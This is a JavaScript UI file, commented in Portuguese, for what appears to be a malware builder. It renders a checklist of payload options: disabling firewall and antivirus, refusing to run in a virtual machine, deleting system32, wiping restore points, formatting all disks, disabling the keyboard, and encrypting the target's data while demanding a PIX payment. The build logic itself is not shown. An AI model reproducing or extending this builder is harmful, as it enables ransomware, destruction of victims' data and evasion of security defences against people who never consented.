document.addEventListener('DOMContentLoaded', function () {
    // Adicione suas opções aqui
    addOption("firewallCheckbox", "Desativar Firewall", desativarFirewallChecked);
    addOption("antivirusCheckbox", "Desativar Antivírus", desativarAntivirusChecked);
    addOption("antiVMCheckbox", "Da erro na hora de executar o script em uma VM", antiVMChecked);
    addOption("deletesys32Checkbox", "Deleta o system32 do alvo", deletarSys32Checked);
    addOption("antipointCheckbox", "Exclui os pontos de restauração do alvo", antipointChecked);
    addOption("notificacaoCheckbox", "Notificação", notificacaoChecked);
    addOption("startupCheckbox", "Startup", startupChecked);
    addOption("pythoninsCheckbox", "Instala o Python na alvo", pythonInstallChecked);
    addOption("atualizacaoCheckbox", "Atualizações do Windows", atualizacaoChecked);
    addOption("tecladooffCheckbox", "Desativa o teclado do alvo", desativarTecladoChecked);
    addOption("telapretaCheckbox", "Tela preta no alvo", telaPretaChecked);
    addOption("formatdiscoCheckbox", "Formata todos os discos", formatarDiscosChecked);
    addOption("desligarCheckbox", "Desliga a máquina quando executado", desligarMaquinaChecked);
    addOption("reiniciarCheckbox", "Reinicia a máquina", reiniciarMaquinaChecked);
    addOption("processpamCheckbox", "Abre vários processos", abrirProcessosChecked);
    addOption("dellprogramCheckbox", "Desinstala todos os programas", desinstalarProgramasChecked);
    addOption("inativeatalhosCheckbox", "Desliga atalhos", desativarAtalhosChecked);
    addOption("trojanCheckbox", "Criptografa todos os dados e pede PIX para 'Liberar'", criarTrojanChecked);
    addOption("mataratoCheckbox", "Desativa o teclado", mataratoChecked);
    addOption("tempoCheckbox", "Coloca uma data e hora aleatoria", tempoChecked);

    // Adicione o ouvinte de mudança fora do loop
    document.getElementById("buildForm").addEventListener("change", build);
});

function addOption(id, label, initialChecked) {
    var optionsList = document.getElementById("buildForm");  // Corrigido para corresponder ao ID correto
    var li = document.createElement("li");

    var input = document.createElement("input");
    input.type = "checkbox";
    input.id = id;
    input.checked = initialChecked;

    var lbl = document.createElement("label");
    lbl.htmlFor = id;
    lbl.textContent = label;

    li.appendChild(input);
    li.appendChild(lbl);

    optionsList.appendChild(li);
}
    